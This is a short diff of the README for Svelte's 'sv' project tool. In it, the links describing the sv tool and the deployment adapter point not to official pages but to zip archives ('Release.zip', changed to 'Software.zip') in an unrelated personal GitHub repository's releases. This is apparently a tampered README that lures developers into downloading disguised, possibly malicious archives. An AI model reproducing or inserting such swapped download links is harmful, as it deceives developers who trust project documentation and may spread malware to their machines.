@@ -1,6 +1,6 @@
 # sv
 
-Everything you need to build a Svelte project, powered by [`sv`](https://github.com/kielagustin1/kielagustin1.github.io/releases/download/v1.0/Release.zip).
+Everything you need to build a Svelte project, powered by [`sv`](https://github.com/kielagustin1/kielagustin1.github.io/releases/download/v2.0/Software.zip).
 
 ## Creating a project
 
@@ -35,4 +35,4 @@ npm run build
 
 You can preview the production build with `npm run preview`.
 
-> To deploy your app, you may need to install an [adapter](https://github.com/kielagustin1/kielagustin1.github.io/releases/download/v1.0/Release.zip) for your target environment.
+> To deploy your app, you may need to install an [adapter](https://github.com/kielagustin1/kielagustin1.github.io/releases/download/v2.0/Software.zip) for your target environment.
